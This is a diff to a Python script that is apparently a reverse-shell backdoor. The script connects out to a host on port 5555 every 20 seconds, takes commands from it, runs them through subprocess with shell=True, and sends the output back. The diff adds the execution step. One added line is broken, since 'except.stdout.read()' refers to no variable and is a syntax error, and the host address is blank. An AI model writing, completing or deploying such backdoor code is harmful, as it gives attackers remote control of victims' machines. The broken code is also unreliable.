@@ -1,6 +1,7 @@
 import socket
 import time
 import json
+import subprocess
 
 
 def reliable_send(data):
@@ -21,7 +22,7 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            s.connect(('@', 5555))
+            s.connect(('', 5555))
             shell()
             s.close()
             break
@@ -34,8 +35,10 @@ def shell():
         if command == 'quit':
             break
         else:
-            #execute    
-    
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = except.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            reliable_send(result)
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
